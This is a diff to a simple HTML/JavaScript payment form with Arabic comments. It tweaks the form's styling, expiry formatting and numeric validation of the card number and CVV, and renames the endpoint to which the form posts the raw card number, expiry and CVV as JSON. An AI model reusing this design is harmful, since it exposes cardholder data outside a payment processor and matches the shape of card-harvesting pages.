@@ -17,6 +17,7 @@
             border: 1px solid #ccc;
             border-radius: 10px;
             background: #f9f9f9;
+            width: 300px;
         }
         input {
             display: block;
@@ -58,7 +59,7 @@
     <script>
         document.getElementById("expiryDate").addEventListener("input", function(e) {
             let value = e.target.value.replace(/\D/g, ''); // إزالة أي أحرف غير أرقام
-            if (value.length >= 2) {
+            if (value.length > 2) {
                 e.target.value = value.slice(0, 2) + '/' + value.slice(2, 4);
             } else {
                 e.target.value = value;
@@ -74,7 +75,7 @@
 
             let hasError = false;
 
-            if (cardNumber.value.length !== 16) {
+            if (cardNumber.value.length !== 16 || isNaN(cardNumber.value)) {
                 cardNumber.classList.add("error");
                 hasError = true;
             } else {
@@ -88,7 +89,7 @@
                 expiryDate.classList.remove("error");
             }
 
-            if (cvv.value.length !== 3) {
+            if (cvv.value.length !== 3 || isNaN(cvv.value)) {
                 cvv.classList.add("error");
                 hasError = true;
             } else {
@@ -106,7 +107,7 @@
                 cvv: cvv.value
             };
 
-            fetch("https://your-server-url.com/submit", {
+            fetch("https://your-server-url.com/send", {  // تأكد من تحديث الرابط برابط السيرفر الفعلي
                 method: "POST",
                 headers: {
                     "Content-Type": "application/json"
